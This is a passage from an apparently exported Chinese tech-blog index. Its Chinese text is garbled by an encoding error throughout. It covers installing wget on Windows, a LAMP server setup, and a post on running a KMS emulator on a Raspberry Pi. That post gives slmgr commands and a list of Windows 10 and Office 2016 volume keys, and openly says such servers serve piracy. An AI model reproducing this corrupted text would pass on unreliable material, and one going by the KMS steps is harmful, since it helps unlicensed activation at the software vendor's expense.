å¼•å­ä¸€ç›´è§‰å¾—Windowsé‡Œé¢åº”è¯¥æœ‰ä¸€ä¸ªç±»ä¼¼wgetçš„å·¥å…·ã€‚ä»Šå¤©æƒ³ä»githubä¸Šä¸‹ä¸€ä¸ªæ–‡ä»¶ï¼Œç»“æœæ–‡ä»¶ç›´æ¥ä»¥æ–‡æœ¬æ–¹å¼è¿”å›äº†(å“åº”å¤´çš„Content-Typeä¸ºtext/plainè€Œä¸æ˜¯applicationç¥é©¬çš„)ï¼Œè‡ªå·±å¾ˆæ€¨å¿µï¼Œè§‰å¾—è¦æ˜¯Windowsèƒ½åƒlinuxä¸€æ ·æœ‰ä¸ªç”¨æ¥wgetç¥é©¬çš„ä¸‹è½½æ–‡ä»¶çš„å‘½ä»¤å°±å¥½äº†â€¦æ‰€ä»¥è‡ªå·±ä¸Šç½‘æœäº†ä¸€ä¸‹ï¼Œè®©è‡ªå·±ç”¨ä¸Šäº†wget. 2. ä¹±æéšä¾¿ç™¾åº¦ï¼Œæ‰¾åˆ°ä¸€ç¯‡åšæ–‡ï¼Œåˆæ‰¾åˆ°äº†ä¸€ä¸ªå«åšGnuWin(http://sourceforge.net/projects/gnuwin32/)çš„é¡¹ç›®ï¼Œè¯¥é¡¹ç›®ä¸»è¦æä¾›Windowsä¸‹çš„GNUå·¥å…·ï¼Œæ¯”å¦‚sed, grep, wgetç­‰ç­‰ã€‚äºæ˜¯ä¸‹è½½å®‰è£…ï¼Œå®‰è£…ç¨‹åºé»˜è®¤å°†ç¨‹åºå®‰è£…åœ¨äº†C:\\Program Files (x86)\\GnuWin32\\binç›®å½•ä¸‹ã€‚ç„¶è€Œå³ä½¿è¿™æ ·ï¼Œæˆ‘è¿˜æ˜¯æ— æ³•ç›´æ¥åœ¨å‘½ä»¤è¡Œé‡Œä½¿ç”¨ã€‚Windowsä¸­æœ‰ä¸€ä¸ªâ€œPATHç¯å¢ƒå˜é‡â€ï¼Œå°†æŸç›®å½•ï¼ˆæ¯”å¦‚C:\\Python27ï¼‰æ·»åŠ è¿›PATHç¯å¢ƒå˜é‡ä¸­ï¼Œå°±å¯ä»¥ç›´æ¥åœ¨å‘½ä»¤è¡Œä¸­è¾“å…¥å‘½ä»¤æ‰“å¼€è¯¥ç›®å½•ä¸‹çš„æ–‡ä»¶ã€‚å¦‚æœæƒ³åœ¨å‘½ä»¤è¡Œä¸­ä½¿ç”¨wgetçš„è¯ï¼ŒæŠŠC:\\Program Files (x86)\\GnuWin32\\binç›®å½•æ·»åŠ è¿›PATHå˜é‡ä¸­å½“ç„¶å¯è¡Œã€‚ä½†æ˜¯è¿™æ ·çš„è¯ï¼Œéšç€å·¥å…·è¶Šæ¥è¶Šå¤šï¼ŒPATHå˜é‡é‡Œé¢çš„è·¯å¾„ä¹Ÿå°±è¶Šæ¥è¶Šå¤šï¼Œç»´æŠ¤èµ·æ¥ä¹Ÿä¼šæ›´åŠ å›°éš¾ï¼Œæ‰€ä»¥è‡ªå·±ä½¿ç”¨äº†ä¸€ç§ç‰¹æ®Šçš„æ–¹æ³•ï¼šåœ¨Cç›˜çš„ç›®å½•ä¸‹å»ºäº†ä¸€ä¸ªCommand_line_programsæ–‡ä»¶å¤¹ç”¨æ¥æ”¾ä¸€äº›è‡ªå·±å¸¸ç”¨çš„å‘½ä»¤è¡Œå·¥å…·ï¼ˆæ¯”å¦‚sqliteï¼‰ï¼Œç„¶åå°†C:\\Command_line_programsï¼ˆä»¥ä¸‹ç®€ç§°C.L.P.ï¼‰æ·»åŠ åˆ°PATHå˜é‡ä¸­ï¼Œè¿™æ ·è‡ªå·±å°±èƒ½ä½¿ç”¨C.L.P.æ–‡ä»¶å¤¹ä¸­çš„å·¥å…·ã€‚å¯æ˜¯ï¼Œè‡ªå·±å·²ç»å°†ç¨‹åºå®‰è£…åˆ°Program Filesé‡Œäº†ï¼Œæ‰€ä»¥éœ€è¦æƒ³ä¸ªåŠæ³•åœ¨C.L.P.æ–‡ä»¶ä¸­æ–°å»ºä¸€ä¸ªæ–‡ä»¶æ¥è¿æ¥åˆ°wgetç¨‹åºã€‚_ç»è¿‡å°è¯•ï¼Œä½¿ç”¨å¿«æ·æ–¹å¼çš„æ–¹æ³•å¤±è´¥äº†ã€‚_æ‰€ä»¥è‡ªå·±æƒ³åˆ°äº†æ–°å»ºæ‰¹å¤„ç†æ–‡ä»¶ã€‚äºæ˜¯åœ¨C.L.P.æ–‡ä»¶å¤¹ä¸­æ–°å»ºwget.bat, å†…å®¹ä¸ºC:\\&quot;Program Files (x86)&quot;\\GnuWin32\\bin\\wget.exe %* ï¼ˆ%*è¡¨ç¤ºåœ¨å‘½ä»¤ä¸­åµŒå…¥ç¨‹åºæ‰€æœ‰å‚æ•°ï¼Œè¯¦æƒ…è¯·ç™¾åº¦æˆ–Google Windowsæ‰¹å¤„ç†ç¼–ç¨‹ï¼‰ï¼Œä¿å­˜ï¼Œåœ¨å‘½ä»¤è¡Œä¸­å°è¯•ä½¿ç”¨wgetï¼ŒæˆåŠŸã€‚ 3. ç„¶è€Œè¿™å¹¶æ²¡æœ‰ä»€ä¹ˆåµç”¨å•Šï¼è‡ªå·±æå®Œä»¥åï¼Œç›¯ç€GnuWinè¿™å‡ ä¸ªå­—ï¼Œçªç„¶æƒ³åˆ°äº†gité‡Œé¢è‡ªå¸¦äº†å¾ˆå¤šGNUå·¥å…·å¯ä»¥ç›´æ¥ä½¿ç”¨ï¼Œäºæ˜¯å°±å»git/binçš„ç›®å½•ç¿»äº†ç¿»ï¼Œæœç„¶ï¼Œé‡Œé¢æ²¡æœ‰wgetï¼Œç„¶è€Œæˆ‘çœ‹åˆ°äº†curlã€‚ç„¶åâ€¦å°±æ²¡æœ‰ç„¶åäº†ã€‚ 4. åè®°è¿™ç¯‡æ–‡ç« æ˜¯èƒ¡ä¹±å‡‘æ•°çš„ï¼Œæœ€è¿‘å­¦ä¹ å…´è¶£ä¸é«˜ï¼Œåˆæœ‰ä¸€å †ä¹±ä¸ƒå…«ç³Ÿçš„äº‹æƒ…è¦å¿™ï¼Œæ‰€ä»¥æ‰˜æ›´äº†å¥½ä¹…T^Tå¥½äº†å¥½äº†è¦å¥½å¥½å­¦ä¹ ï¼Œè¯´å¥½äº†å¤šå»ä½“éªŒæ¡†æ¶å‘¢QAQ","categories":[{"name":"ä¹±ä¸ƒå…«ç³Ÿ","slug":"ä¹±ä¸ƒå…«ç³Ÿ","permalink":"https://blog.stdioa.com/categories/ä¹±ä¸ƒå…«ç³Ÿ/"}],"tags":[{"name":"Windows","slug":"Windows","permalink":"https://blog.stdioa.com/tags/Windows/"},{"name":"wget","slug":"wget","permalink":"https://blog.stdioa.com/tags/wget/"}]},{"title":"æ­å»ºç§æœ‰KMSæœåŠ¡å™¨","slug":"building-a-private-kms-server","date":"2015-09-02T14:26:00.000Z","updated":"2017-06-29T04:38:39.914Z","comments":true,"path":"2015/09/building-a-private-kms-server/","link":"","permalink":"https://blog.stdioa.com/2015/09/building-a-private-kms-server/","excerpt":"æœ€è¿‘win10åˆé¢‘ç¹æç¤ºâ€œè®¸å¯å³å°†è¿‡æœŸâ€ï¼Œä¹‹å‰æ‰¾åˆ°çš„kmsæœåŠ¡å™¨åˆæŒ‚æ‰äº†ï¼Œäºæ˜¯å°±å†³å®šè‡ªå·±æ­ä¸€ä¸ªè‡ªå·±ç”¨ã€‚","text":"æœ€è¿‘win10åˆé¢‘ç¹æç¤ºâ€œè®¸å¯å³å°†è¿‡æœŸâ€ï¼Œä¹‹å‰æ‰¾åˆ°çš„kmsæœåŠ¡å™¨åˆæŒ‚æ‰äº†ï¼Œäºæ˜¯å°±å†³å®šè‡ªå·±æ­ä¸€ä¸ªè‡ªå·±ç”¨ã€‚ 1. å¼•å­å¥½ä¹…æ²¡æ›´æ–°æ—¥å¿—äº†ï¼Œæš‘å‡åœ¨å®¶æ¯å¤©è¿‡çš„ä¹±ä¸ƒå…«ç³Ÿï¼Œå°±æ²¡æ€ä¹ˆç ”ç©¶æŠ€æœ¯ï¼Œäºæ˜¯åšå®¢ä¹Ÿæ²¡æ€ä¹ˆæ›´æ–°â€¦ä»Šå¤©éšä¾¿å†™ç‚¹ä»€ä¹ˆå‡‘ä¸ªæ•°_(:Ğ·ã‚âˆ )_ 2. ç§‘æ™®KMS (Key Management Service), å¯†é’¥ç®¡ç†æœåŠ¡ï¼Œæ˜¯ä¸€ç§å¯¹WindowsåŠOfficeäº§å“è¿›è¡Œæ‰¹é‡æˆæƒçš„æœåŠ¡ï¼Œé€šå¸¸è¢«éƒ¨ç½²åœ¨å¤§å‹ä¼ä¸šå±€åŸŸç½‘ä¸­ï¼Œç”¨äºå¯¹æ‰¹é‡æˆæƒç‰ˆï¼ˆå³VOLç‰ˆï¼‰Windowsç³»ç»Ÿè¿›è¡Œå¤§æ‰¹é‡çš„æ¿€æ´»ã€‚KMSæœåŠ¡å™¨çš„ä½œç”¨æ˜¯ç»™å±€åŸŸç½‘ä¸­çš„æ‰€æœ‰è®¡ç®—æœºçš„æ“ä½œç³»ç»Ÿæä¾›ä¸€ä¸ªæœ‰æ•ˆçš„äº§å“åºåˆ—å·ï¼Œç„¶åè®¡ç®—æœºé‡Œé¢çš„KMSæœåŠ¡å°±ä¼šè‡ªåŠ¨å°†ç³»ç»Ÿæ¿€æ´»ã€‚æ¯ä¸€ä¸ªç”±KMS Serveræä¾›çš„åºåˆ—å·çš„æœ‰æ•ˆæœŸåªæœ‰180å¤©ï¼Œè€Œä¸æ˜¯å…¶ä»–ç‰ˆæœ¬çš„æ°¸ä¹…ä½¿ç”¨ä¸€ä¸ªåºåˆ—å·ã€‚æ‰€ä»¥æ“ä½œè€…å¿…é¡»åœ¨å¿«åˆ°æœŸçš„æ—¶å€™åœ¨æ­¤æ‰‹åŠ¨è¿æ¥KMSæœåŠ¡å™¨è®©å®ƒæä¾›ä¸€ä¸ªæ–°çš„åºåˆ—å·ï¼Œå¦åˆ™180å¤©ä»¥åå°±ä¼šå›åˆ°è¯•ç”¨ç‰ˆæœ¬çŠ¶æ€ã€‚ç”±äºKMSç³»ç»Ÿéƒ¨ç½²è¾ƒä¸ºå®¹æ˜“ï¼Œæ‰€ä»¥åœ¨å›½å†…å¾ˆå¤šäººé€šè¿‡MSDNç­‰æ¸ é“ä¸‹è½½VOLç‰ˆæœ¬çš„è½¯ä»¶ï¼Œç„¶åé€šè¿‡KMSæœåŠ¡è¿›è¡Œæ¿€æ´»ï¼Œå·²è¾¾åˆ°ç›—ç‰ˆçš„ç›®çš„ã€‚ 3. æ­(luan)å»º(gao)è¿‡ç¨‹æ˜¨å¤©åœ¨æ»¡å¤§è¡—ä¹±æ‰¾é‡ç”ŸKMSæœåŠ¡å™¨çš„æ—¶å€™å‘ç°äº†ä¸€ä¸ªå¸–å­ï¼šä½¿ç”¨KMSæ¿€æ´»windowsç³»ç»ŸåŠVL-officeç³»åˆ—, é‡Œé¢æä¾›äº†ä¸€ä¸ªé“¾æ¥æŒ‡å‘ä¸€ä¸ªå¸–å­ï¼Œå¸–å­ä¸­æä¾›äº†Pythonå’ŒCç‰ˆæœ¬çš„KMSæœåŠ¡å™¨æ¨¡æ‹Ÿå™¨ï¼Œå¯ä»¥åœ¨è‡ªå·±çš„æœåŠ¡å™¨ä¸­è¿›è¡ŒKMSæœåŠ¡å™¨éƒ¨ç½²ã€‚äºæ˜¯æŠŠä»£ç æäº†ä¸‹æ¥ï¼ˆä¸ºæ­¤è¿˜æ³¨å†Œäº†ä¸ªè´¦å·, pythonç‰ˆçš„ä»£ç åœ¨è¿™é‡Œ)ï¼Œç”¨VSFTPå°†ä»£ç ä¼ åˆ°äº†è‡ªå·±çš„æ ‘è“æ´¾ä¸Šï¼Œç„¶åè¿è¡Œpython server.pyè¿›è¡Œéƒ¨ç½²ã€‚python server.py TCP server listening at 0.0.0.0 on port 1688. ç„¶ååœ¨Windowsç³»ç»Ÿä¸­æ‰“å¼€å…·æœ‰ç®¡ç†å‘˜æƒé™çš„å‘½ä»¤æç¤ºç¬¦ï¼Œè¾“å…¥slmgr -skms 192.168.155.2:1688è®¾ç½®KMSæœåŠ¡å™¨åœ°å€ï¼ˆåœ°å€å¯ä»¥æ›´æ¢ï¼‰ï¼Œç„¶åè¾“å…¥`slmgr -atoâ€™è¿›è¡Œç³»ç»Ÿæ¿€æ´»ï¼Œæ­¤æ—¶æœåŠ¡å™¨ç«¯æ˜¾ç¤ºï¼šConnection accepted: 192.168.56.1:13023 Received V6 request on Wed Sep 2 22:59:55 2015. Connection closed: 192.168.56.1:13023 Windowsç³»ç»Ÿæç¤ºâ€œæˆåŠŸåœ°æ¿€æ´»äº†äº§å“â€ï¼Œæ¿€æ´»æˆåŠŸã€‚åœ¨æ ‘è“æ´¾ä¸Šéƒ¨ç½²æˆåŠŸä»¥åï¼Œéšæ‰‹åœ¨VPSä¸Šéƒ¨ç½²äº†ä¸€ä»½ä»¥å¤‡ç”¨ã€‚å¸–å­ä¸­æäº†ä¸€ç§è®¾ç½®Linuxç³»ç»Ÿå¯åŠ¨é¡¹æ¥ä½¿KMSæœåŠ¡å™¨å¼€æœºè‡ªåŠ¨éƒ¨ç½²çš„æ–¹æ³•ï¼Œä¸è¿‡è‡ªå·±æ²¡æœ‰è¿™ä¸ªéœ€æ±‚å°±æ²¡æã€‚ 4. æ€»ç»“è¿™ç¯‡æ–‡ç« å¥½åƒæœ‰ç‚¹æ°´ï¼Œä¸»è¦æ˜¯å› ä¸ºè‡ªå·±å®åœ¨æ²¡ä»€ä¹ˆä¸œè¥¿å†™äº†â€¦è‡ªå·±çš„æš‘å‡è¿‡çš„ä¹±ä¸ƒå…«ç³Ÿï¼Œæµªè´¹äº†å¾ˆå¤šæ—¶é—´åœ¨æ¸¸æˆä¸Šï¼Œæ²¡ä»€ä¹ˆå¿ƒæƒ…ç ”ç©¶æŠ€æœ¯ã€‚ç°åœ¨å¼€å­¦äº†ï¼Œæœ‰æ›´å¤šæ—¶é—´æ¥é’»ç ”æŠ€æœ¯äº†ï¼Œæ”¶æ”¶å¿ƒæ‰¾æ‰¾çŠ¶æ€ï¼Œä»¥ååšå®¢ä¼šå®šæœŸæ›´æ–°çš„ï¼Œæˆ‘å¯¹æ ‘è“æ´¾ç”µæºç¯å‘èª“â†’_â†’ 5. å„ç§Keyæœ€åé™„ä¸ŠOffice 2016å’ŒWindows 10çš„VOLç‰ˆæ¿€æ´»ç ï¼Œå…¶å®ƒç‰ˆæœ¬è½¯ä»¶æ¿€æ´»ç è¯·è‡ªè¡Œç™¾åº¦ã€‚Office Professional Plus 2016 - XQNVK-8JYDB-WJ9W3-YJ8YR-WFG99Office Standard 2016 - JNRGM-WHDWX-FJJG3-K47QV-DRTFMProject Professional 2016 - YG9NW-3K39V-2T3HJ-93F3Q-G83KTProject Standard 2016 - GNFHQ-F6YQM-KQDGJ-327XX-KQBVCVisio Professional 2016 - PD3PC-RHNGV-FXJ29-8JK7D-RJRJKVisio Standard 2016 - 7WHWN-4T7MP-G96JF-G33KR-W8GF4Access 2016 - GNH9Y-D2J4T-FJHGG-QRVH7-QPFDWExcel 2016 - 9C2PK-NWTVB-JMPW8-BFT28-7FTBFOneNote 2016 - DR92N-9HTF2-97XKM-XW2WJ-XW3J6Outlook 2016 - R69KK-NTPKF-7M3Q4-QYBHW-6MT9BPowerPoint 2016 - J7MQP-HNJ4Y-WJ7YM-PFYGF-BY6C6Publisher 2016 - F47MM-N3XJP-TQXJ9-BP99D-8K837Skype for Business 2016 - 869NQ-FJ69K-466HW-QYCP2-DDBV6Word 2016 - WXY84-JN2Q9-RBCCQ-3Q3J3-3PFJ6Windows 10 Home - TX9XD-98N7V-6WMQ6-BX7FG-H8Q99Windows 10 Home N - 3KHY7-WNT83-DGQKR-F7HPR-844BMWindows 10 Home Single Language - 7HNRX-D7KGG-3K4RQ-4WPJ4-YTDFHWindows 10 Home Country Specific - PVMJN-6DFY6-9CCP6-7BKTT-D3WVRWindows 10 Professional - W269N-WFGWX-YVC9B-4J6C9-T83GXWindows 10 Professional N - MH37W-N47XK-V7XM9-C7227-GCQG9Windows 10 Education - NW6C2-QMPVW-D7KKK-3GKT6-VCFB2Windows 10 Education N - 2WH4N-8QGBV-H22JP-CT43Q-MDWWJWindows 10 Enterprise - NPPR9-FWDCX-D2C8J-H872K-2YT43Windows 10 Enterprise N - DPH2V-TTNVB-4X9Q3-TJR4H-KHJW4Windows 10 Enterprise 2015 LTSB - WNMTR-4C88C-JK8YV-HQ7T2-76DF9Windows 10 Enterprise 2015 LTSB N - 2F77B-TNFGY-69QQF-B8YKP-D69TJå¯ä»¥è€ƒè™‘æœ‰ç©ºæä¸€ä¸ªOffice 2016æ¥ç©ç©ã€‚ 6. å‚è€ƒæ–‡æ¡£KMS - äº’åŠ¨ç™¾ç§‘ä½¿ç”¨KMSæ¿€æ´»windowsç³»ç»ŸåŠVL-officeç³»åˆ—Emulated KMS Servers on non-Windows platforms","categories":[{"name":"ä¹±ä¸ƒå…«ç³Ÿ","slug":"ä¹±ä¸ƒå…«ç³Ÿ","permalink":"https://blog.stdioa.com/categories/ä¹±ä¸ƒå…«ç³Ÿ/"}],"tags":[{"name":"KMS","slug":"KMS","permalink":"https://blog.stdioa.com/tags/KMS/"}]},{"title":"LAMPç¯å¢ƒæ­å»ºå¿ƒå¾—","slug":"deploy-a-LAMP-environment","date":"2015-07-09T12:05:00.000Z","updated":"2017-06-29T04:38:39.951Z","comments":true,"path":"2015/07/deploy-a-LAMP-environment/","link":"","permalink":"https://blog.stdioa.com/2015/07/deploy-a-LAMP-environment/","excerpt":"é—²æ¥æ— äº‹ï¼Œåœ¨è™šæ‹Ÿæœºä¸Šæ­äº†ä¸€ä¸ªLAMPæœåŠ¡å™¨ç¯å¢ƒï¼ŒæŠŠå®‰è£…åŠé…ç½®è¿‡ç¨‹è®°äº†ä¸‹æ¥ã€‚","text":"é—²æ¥æ— äº‹ï¼Œåœ¨è™šæ‹Ÿæœºä¸Šæ­äº†ä¸€ä¸ªLAMPæœåŠ¡å™¨ç¯å¢ƒï¼ŒæŠŠå®‰è£…åŠé…ç½®è¿‡ç¨‹è®°äº†ä¸‹æ¥ã€‚ 1. å¼•å­ 1.1 ç¯å¢ƒç‰ˆæœ¬æ­¤æ¬¡æ­å»ºçš„LAMPç¯å¢ƒç‰ˆæœ¬ï¼šUbuntu 14.04 LTSApache 2.4.7mysql 5.6.19php 5.5.9 1.2 å†™(hu)åœ¨(che)å¼€(yi)å¤´(tong)é¢â€¦å…¶å®æ²¡ä»€ä¹ˆå¥½è¯´çš„ï¼Œè‡ªå·±ä¸€ç›´æƒ³è‡ªå·±åŠ¨æ‰‹æ­å»ºã€é…ç½®ä¸€ä¸ªæœåŠ¡å™¨ï¼Œæš‘å‡ä¹‹å‰å¸ˆå¤ªï¼ˆåˆ«é—®æ˜¯è°ï¼‰è¯´å¦‚æœè¦æå®‰å…¨çš„è¯æœ€å¥½å…ˆè‡ªå·±ä»å¤´æ­ä¸€ä¸ªæœåŠ¡å™¨ï¼ŒæŠŠå„ç§æœåŠ¡å¼„æ¸…æ¥šï¼Œå¯¹æ•´ä¸ªæ¶æ„æœ‰ä¸€ä¸ªç³»ç»Ÿçš„ç†è§£ï¼Œè¿™æ ·å†æ·±å…¥æå®‰å…¨çš„è¯æ¥å—ä¸€äº›è§‚å¿µä¹Ÿä¼šæ›´å¿«æ›´å®¹æ˜“ï¼›ä½†æ˜¯å› ä¸ºè‡ªå·±å¤ªæ‡’ï¼Œå†åŠ ä¸Šä¸Šå­¦æœŸå¿™æˆç‹—ï¼ˆå…¶å®è¿˜æ˜¯å¤ªæ‡’ï¼‰ï¼Œä¸€ç›´æ²¡æœ‰å»åšè¿™ä»¶äº‹ã€‚æš‘å‡åœ¨ä¸€ä¸ªå°å…¬å¸åšè½¯ä»¶æµ‹è¯•ï¼Œæ¯å¤©å¥½åƒä¹Ÿæ²¡ä»€ä¹ˆäº‹å¹²ï¼Œæœ‰å¤§æŠŠçš„æ—¶é—´åšè‡ªå·±çš„äº‹æƒ…ï¼Œäºæ˜¯è‡ªå·±ç”¨äº†ä¸€ä¸­åˆåŠ åŠä¸ªä¸‹åˆçš„æ—¶é—´ç…§ç€ä¸€ä»½æŒ‡å—æŠŠå®ƒæ­å¥½äº†ã€‚ ä¸è¿‡è¯è¯´å›æ¥ï¼Œè½¯ä»¶æµ‹è¯•çœŸçš„å¾ˆæ— èŠ_(:Ğ·ã‚âˆ )_ 2. ç§‘æ™®LAMP: Linux + Apache + Mysql + PHPç§‘æ™®ç»“æŸã€‚åˆšçœ‹åˆ°LAMPé‡Œé¢çš„Pè¿˜èƒ½æŒ‡Python 0.0 3. æ­å»ºè¿‡ç¨‹ 3.1 å®‰è£…Linuxæˆ‘æ‰‹ä¸Šç°åœ¨æ²¡å®ä½“æœºäº†ï¼Œåªæœ‰ä¸€ä¸ªæ ‘è“æ´¾ï¼Œæˆ‘ä¹Ÿä¸æƒ³æ¯å¤©å¸¦ç€å®ƒå»ä¸Šç­ï¼Œä½•å†µAMDæ¶æ„ä¸Šé¢è½¯ä»¶å¥½åƒå°‘ä¸€ç‚¹ç‚¹ï¼Œæ›´ä½•å†µæ ‘è“æ´¾æ€§èƒ½æŒºå·®çš„ï¼ˆæ­¤å¤„çœç•¥ä¸€å¨å€Ÿå£ï¼‰ï¼Œæ‰€ä»¥æˆ‘åªç”¨Virtual Boxè£…äº†ä¸€ä¸ªè™šæ‹Ÿæœºã€‚è¯´åˆ°Linuxï¼Œé€‰ä¸€ä¸ªç”¨èµ·æ¥æ¯”è¾ƒèˆ’æœçš„çš„å‘è¡Œç‰ˆè¿˜æ˜¯æŒºé‡è¦çš„ã€‚Linuxå‘è¡Œç‰ˆä¼—å¤šï¼Œä¸€èˆ¬ç”¨Red Hatæˆ–è€…CentOSï¼ˆRHçš„ç¤¾åŒºç‰ˆï¼‰æˆ–è€…Ubuntu Serveræ¥åšæœåŠ¡å™¨ï¼Œä¸è¿‡â€¦è¿™å­¦æœŸç”¨Debianç³»å‘è¡Œç‰ˆç”¨ä¹ æƒ¯äº†ï¼Œå†æ¢åˆ°RHç³»çš„æ„Ÿè§‰æœ‰ç‚¹ä¸é€‚åº”ï¼Œäºæ˜¯æˆ‘é€‰æ‹©äº†Ubuntu Server. å½“ç„¶ï¼Œå¦‚æœä½ æƒ³é”»ç‚¼ä¸€ä¸‹ï¼Œæ¨èä½¿ç”¨Arch Linuxæ¥æ­å»ºæœåŠ¡å™¨ã€‚ä¸‹è½½Linuxé•œåƒï¼Œæ­è™šæ‹Ÿæœºï¼Œé…ç½®è™šæ‹Ÿç½‘ç»œ&amp;SSHï¼Œæ›´æ”¹è½¯ä»¶æºï¼Œæ›´æ–°è½¯ä»¶ï¼Œé…ç½®è‡ªå·±éœ€è¦çš„vim &amp; tmux &amp; vsftpdï¼Œä¸å¤šè¯´ï¼Œæƒ³è¯¦ç»†äº†è§£çš„å¯ä»¥å»çœ‹æŸLinuxè™šæ‹Ÿæœºå®‰è£…åŠé…ç½®æŒ‡å—ï¼ˆä»£å·PA0ï¼‰ã€‚ä¸Šå­¦æœŸè£…Linuxè£…äº†ç»ä¸ä¸‹10éï¼Œå†è¯´ä¸‹å»è‡ªå·±éƒ½è¦åäº†ã€‚ä¸è¿‡å€¼å¾—ä¸€æçš„æ˜¯ï¼ŒUbuntu Serverå®‰è£…ç¨‹åºçš„ç”¨æˆ·ä½“éªŒç®€ç›´æ£’ï¼Œå®‰è£…è¿‡ç¨‹ä¸­æœ‰ä¸€æ­¥æ˜¯è®¾ç½®é”®ç›˜å¸ƒå±€ï¼Œä»¥å‰éƒ½è¦è‡ªå·±å»ä¸€ä¸ªé•¿é•¿çš„åˆ—è¡¨é‡Œç¿»è‡ªå·±çš„é”®ç›˜å¸ƒå±€ï¼ˆé€šå¸¸æ˜¯USï¼‰ï¼Œè€ŒUbuntu Serveræä¾›äº†ä¸€ä¸ªå°è„šæœ¬æ¥è¿›è¡Œè‡ªåŠ¨æ£€æµ‹ï¼šä¾ç…§æç¤ºæ•²å‡ ä¸ªå­—æ¯/ç¬¦å·ï¼Œå†å›ç­”ä¸€ä¸ªé—®é¢˜ï¼Œå®‰è£…ç¨‹åºä¼šè‡ªåŠ¨æ£€æµ‹å‡ºé€‚åˆä½ çš„é”®ç›˜å¸ƒå±€ã€‚Apacheè¾“å…¥apt-get install apache2å‘½ä»¤å®‰è£…apache.å®‰è£…è¿‡ç¨‹ä¸­apacheæœåŠ¡å·²ç»å¯åŠ¨ï¼Œå¦‚æœæœªå¯åŠ¨ï¼Œåˆ™è¾“å…¥service apache2 startå¯åŠ¨apacheæœåŠ¡ã€‚å¯åŠ¨åè®¿é—®æœåŠ¡å™¨ipï¼Œä¼šå‡ºç°apacheçš„æµ‹è¯•é¡µé¢ã€‚MySQLè¾“å…¥apt-get install mysql-server-5.6 mysql-client-5.6è¿›è¡Œå®‰è£…ã€‚å®‰è£…è¿‡ç¨‹ä¸­éœ€è¦è¾“å…¥MySQL rootå¯†ç ã€‚PHPè¾“å…¥apt-get install php5 libapache2-mod-php5å®‰è£…php, å®‰è£…è¿‡åéœ€è¦è¾“å…¥service apache2 restarté‡å¯apacheæœåŠ¡ã€‚ 3.2 é…ç½®å®‰è£…phpMyAdminè¾“å…¥apt-get install phpmyadminè¿›è¡Œå®‰è£…ï¼Œå®‰è£…çš„æ—¶å€™ä¼šæç¤ºè¾“å…¥mysqlçš„rootå¯†ç ï¼Œå¹¶ä¸”æç¤ºæ–°å»ºä¸€ä¸ªæ•°æ®åº“ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥æŒ‰éœ€æ±‚ä¸æ–°å»ºã€‚å®‰è£…å¥½ä»¥åè®¿é—®http://localhost/phpmyadmin/index.php ï¼Œç™»å½•ä¹‹åé¡µé¢ä¸‹æ–¹ä¼šæœ‰è­¦å‘Šâ€œç¼ºå°‘ mcrypt æ‰©å±•ã€‚è¯·æ£€æŸ¥ PHP é…ç½®ã€‚â€æ­¤æ—¶æŒ‰ç…§æŒ‡å—çš„æ–¹æ³•åšæ²¡æœ‰æ•ˆæœï¼Œç»ç™¾åº¦+Googleåæ‰¾åˆ°äº†è§£å†³æ–¹æ¡ˆï¼šå®‰è£…php5-mcryptåï¼Œæ›´æ”¹php.iniåé—®é¢˜æœªè§£å†³ï¼Œæ ¹æ®å®˜æ–¹çš„mcryptå®‰è£…æŒ‡å—ï¼Œè¾“å…¥php5enmod mcryptåï¼Œé—®é¢˜è§£å†³ã€‚MySQLå‘½ä»¤è¡Œæ— æ³•å¯åŠ¨æ³¨ï¼šè¿™æ®µæ˜¯è‡ªå·±çæŠ˜è…¾çš„ï¼Œå•¥éƒ½æ²¡çœ‹å°±ä¹±ç©é‡åˆ°çš„é—®é¢˜ã€‚è¾“å…¥mysqlåé‡åˆ°é—®é¢˜ï¼š12âœ ~ mysqlERROR 1045 (28000): Access denied for user &apos;stdio&apos;@&apos;localhost&apos; (using password: NO)å°è¯•ç”¨rootæƒé™è¿è¡Œï¼Œå¾—åˆ°åŒæ ·çš„ç»“æœã€‚12âœ ~ sudo mysqlERROR 1045 (28000): Access denied for user &apos;root&apos;@&apos;localhost&apos; (using password: NO)ä¸€ç•ªç™¾åº¦+google+SegmentFaultåï¼Œæ‰¾åˆ°æ­£ç¡®è¿›å…¥å‘½ä»¤è¡Œçš„å§¿åŠ¿ï¼š123456789101112131415âœ ~ sudo mysql -u root -pEnter password:Welcome to the MySQL monitor. Commands end with ; or \\g.Your MySQL connection id is 55Server version: 5.6.19-0ubuntu0.14.04.1 (Ubuntu)Copyright (c) 2000, 2014, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Type &apos;help;&apos; or &apos;\\h&apos; for help. Type &apos;\\c&apos; to clear the current input statement.mysql&gt;è®¾ç½®Apacheè™šæ‹Ÿç›®å½•æŠŠæ‰€æœ‰æ–‡ä»¶å…¨éƒ¨æ”¾åœ¨/var/wwwä¸‹çœŸçš„å¥½éº»çƒ¦ï¼Œä½•å†µæ™®é€šè´¦æˆ·æ²¡æœ‰/var/wwwçš„å†™æƒé™ï¼Œæ‰€ä»¥è®¾ç½®ä¸€ä¸ªaliasï¼Œå°†æŸä¸ªApacheè™šæ‹Ÿç›®å½•æ˜ å°„åˆ°homeç›®å½•ä¸‹ï¼Œä»¥åæ“ä½œèµ·æ¥å°±ä¼šæ–¹ä¾¿å¾ˆå¤šã€‚ä¿®æ”¹/etc/apache2/mods-enabled/alias.confæ–‡ä»¶ï¼Œæ·»åŠ å¦‚ä¸‹è¡Œï¼Œç„¶åé‡å¯ApacheæœåŠ¡ï¼š12345678Alias /web &quot;/home/stdio/websites/&quot;&lt;Directory &quot;/home/stdio/websites/&quot;&gt; Options None AllowOverride None Order allow,deny Allow from all&lt;/Directory&gt;ç„¶è€Œåœ¨æˆ‘è®¿é—®http://localhost/webæ—¶ï¼Œå´å¾—åˆ°äº†503 Forbiddençš„çŠ¶æ€ç ï¼Œå„ç§ä¹±è®¿é—®æ— 